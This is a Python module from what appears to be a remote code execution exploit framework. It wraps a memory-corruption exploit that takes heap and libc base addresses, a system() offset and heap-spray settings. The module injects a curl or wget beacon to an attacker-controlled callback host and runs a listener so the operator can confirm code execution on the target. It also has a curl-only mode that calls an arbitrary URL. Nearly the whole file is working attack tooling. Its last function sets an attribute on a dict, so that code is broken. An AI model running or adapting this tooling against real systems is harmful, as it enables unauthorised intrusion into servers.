"""modes/probe.py — Probe (beacon) and curl-only RCE confirmation modes."""
from __future__ import annotations
import threading

from config import DEFAULT_SYSTEM_OFFSET
from core.exploit import mode_exploit, _run_callback_listener, kill_port
from core.spray import wait_alive


class _ProbeState:
    def __init__(self):
        self.event = threading.Event()
        self.output = None


def mode_probe_cmd(host: str, port: int,
                   cb_host: str = "192.168.140.101", cb_port: int = 8006,
                   cb_path: str = "/ping",
                   heap_base: int = 0, libc_base: int = 0,
                   system_off: int = DEFAULT_SYSTEM_OFFSET,
                   offsets=None, tries: int = 10,
                   vhost: str = "l", use_ssl: bool = False,
                   spray_path: str = None) -> dict:

    """
    Probe mode: inject a curl/wget beacon and wait for the HTTP callback.

    Returns dict with keys: hit, exploit_success, winning_addr,
    callback_detail, cb_url.
    """
    cb_url = f"http://{cb_host}:{cb_port}{cb_path}"
    cmd = (
        f"curl -sm3 {cb_url} 2>/dev/null || "
        f"wget -q -O /dev/null {cb_url} 2>/dev/null"
    )

    state = _ProbeState()
    listener_ready = threading.Event()
    listener = threading.Thread(
        target=_run_callback_listener,
        args=("0.0.0.0", cb_port, state, listener_ready),
        daemon=True,
    )
    listener.start()
    listener_ready.wait(5)

    print(f"[*] Probe listener started on 0.0.0.0:{cb_port}")
    print(f"[*] Expecting callback: {cb_url}")

    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        return {
            "hit": False, "exploit_success": False,
            "winning_addr": None, "callback_detail": None,
            "cb_url": cb_url, "error": "target unreachable",
        }

    exploit_result = mode_exploit(
        host, port, cmd,
        heap_base=heap_base, libc_base=libc_base,
        system_off=system_off, offsets=offsets,
        tries_per_offset=tries, vhost=vhost, use_ssl=use_ssl,
        spray_path=spray_path,
    )


    hit = state.event.wait(15)

    return {
        "hit": hit,
        "exploit_success": exploit_result.get("success", False),
        "winning_addr": exploit_result.get("winning_addr"),
        "callback_detail": state.output if hit else None,
        "cb_url": cb_url,
    }


def mode_curl_only(host: str, port: int, curl_url: str,
                   heap_base: int = 0, libc_base: int = 0,
                   system_off: int = DEFAULT_SYSTEM_OFFSET,
                   offsets=None, tries: int = 10,
                   vhost: str = "l", use_ssl: bool = False,
                   spray_path: str = None) -> dict:

    """
    Curl-only RCE: fire-and-forget curl to a URL, no callback listener.

    Useful when you control the target URL and can check logs separately.
    Returns the exploit result dict directly.
    """
    cmd = f"curl -sm3 {curl_url}"
    result = mode_exploit(
        host, port, cmd,
        heap_base=heap_base, libc_base=libc_base,
        system_off=system_off, offsets=offsets,
        tries_per_offset=tries, vhost=vhost, use_ssl=use_ssl,
        spray_path=spray_path,
    )

    result.curl_url = curl_url
    return result
